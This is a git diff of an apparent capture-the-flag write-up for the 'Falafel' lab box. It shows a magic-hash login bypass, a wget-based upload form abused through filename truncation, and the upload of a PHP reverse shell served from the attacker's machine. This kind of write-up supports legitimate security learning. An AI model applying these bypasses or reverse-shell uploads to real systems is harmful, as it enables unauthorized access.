@@ -98,14 +98,14 @@ At this point we can make some assumptions on the results.
 So with that information, the next step is to try and bypass the login form.
 Generally start with trying some simple SQL Injection techniques, since we did see the /connection.php. As well as scouring stackoverflow for php auth bypasses. None of that worked, so googling continues, when i did find a writeup on Magic Hashes from WhiteHat Security[^1] (Interesting research, i recommend a read through). So what we'll use is a simple hash collision.
 Supplying ```username=admin&password=240610708``` to the /login.php site will result in a Login Successful!  
-And now we are presented with /upload.php which from previous information stated, is vulnerable to some kind of file upload bypass. Another assumption is that files uploaded through this form is also added to /uploads/ found with gobuster.
-![Falafel-Lovers---Image-Upload---Mozilla-Firefox_063](/img/posts/2018/06/falafel-writeup/Falafel-Lovers---Image-Upload---Mozilla-Firefox_063.png)
+And now we are presented with /upload.php which from previous information stated, is vulnerable to some kind of file upload bypass. Another assumption is that files uploaded through this form is also added to /uploads/ found with gobuster.  
+![Falafel-Lovers---Image-Upload---Mozilla-Firefox_063](/img/posts/2018/06/falafel-writeup/Falafel-Lovers---Image-Upload---Mozilla-Firefox_063.png)  
 Seeing that the upload form cannot browse a file to upload, but rather specify a URL we can start a simple http webserver with python.
 ```
 root@kali:~/Falafel$ python -m SimpleHTTPServer 3999
 Serving HTTP on 0.0.0.0 port 3999 ...
 ```
-Seeing that it requests an image to be uploaded. I reckon thats the first thing i should try, in order to see if it presents me with a link to my uploaded file.
+Seeing that it requests an image to be uploaded. I reckon thats the first thing i should try, in order to see if it presents me with a link to my uploaded file.  
 Uploading "http://10.10.14.7:3999/viking.png" i get presented with this output.
 ```
 CMD: cd /var/www/html/uploads/0621-1924_63b0bd5de1c81bcd; wget 'http://10.10.14.7:3999/viking.png'
@@ -120,8 +120,8 @@ Saving to: 'viking.png'
 
 2018-06-21 19:24:49 (19.1 MB/s) - 'viking.png' saved [8889/8889]
 ```
-Cool so that is using a tool we should recognize, wget. It also echoes out the folder it saves the image to. A simple browse to ```http://10.10.10.73/uploads/0621-1924_63b0bd5de1c81bcd/viking.png``` should then present us with the image.
-![viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065](/img/posts/2018/06/falafel-writeup/viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065.png)
+Cool so that is using a tool we should recognize, wget. It also echoes out the folder it saves the image to. A simple browse to ```http://10.10.10.73/uploads/0621-1924_63b0bd5de1c81bcd/viking.png``` should then present us with the image.  
+![viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065](/img/posts/2018/06/falafel-writeup/viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065.png)  
 So it gives us both the folder name where it is saved and also we have access to it... Since it is running a php backend, lets try and upload a reverse shell.
 ```
 root@kali:~/Falafel$ cp /usr/share/webshells/php/php-reverse-shell.php ./sb.php
@@ -138,8 +138,9 @@ Trying to upload sb.php using a URL, i get the response:
 Bad extension
 Specify a URL of an image to upload:
 
-Running through OWASP's Guide to bypass filtered uploads[^2], Didn't really give anything either. So again after some googling, i had the idea that since the upload form is using wget to fetch files. Then maybe supplying a filename longer then linux can handle, maybe we can get it to "cut off" the picture file ending. Popping over to UnixStackExchange[^3], we get to know that a linux filename can be 255 characters long. So maybe if I find a filename that is long enough, that might cause an overflow, thus removing all characters over the limit.
-so i tested with a 245 character long filename, and the response was:
+Running through OWASP's Guide to bypass filtered uploads[^2], Didn't really give anything either. So again after some googling, i had the idea that since the upload form is using wget to fetch files. Then maybe supplying a filename longer then linux can handle, maybe we can get it to "cut off" the picture file ending.  
+Popping over to UnixStackExchange[^3], we get to know that a linux filename can be 255 characters long. So maybe if I find a filename that is long enough, that might cause an overflow, thus removing all characters over the limit.  
+So i tested with a 245 character long filename, and the response was:
 ```
 Upload Succsesful!
 Output:
@@ -256,11 +257,12 @@ echo "EatSleepPwnRepeat" > root.txt
 [..snip..]
 yossi@falafel:~$
 ```
-This was a really interesting box! Done!
+This was a really interesting box!  
+Done!
 
 
-[^1]: [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)
-[^2]: [OWASP Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
-[^3]: [Unix Stack Excange](https://unix.stackexchange.com/questions/32795/what-is-the-maximum-allowed-filename-and-folder-size-with-ecryptfs)
-[^4]: [Ubuntu Wikipedia](https://wiki.ubuntu.com/Security/Privileges)
+[^1]: [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)  
+[^2]: [OWASP Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)  
+[^3]: [Unix Stack Excange](https://unix.stackexchange.com/questions/32795/what-is-the-maximum-allowed-filename-and-folder-size-with-ecryptfs)  
+[^4]: [Ubuntu Wikipedia](https://wiki.ubuntu.com/Security/Privileges)  
 [^5]: [iraw2png.pl](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/)
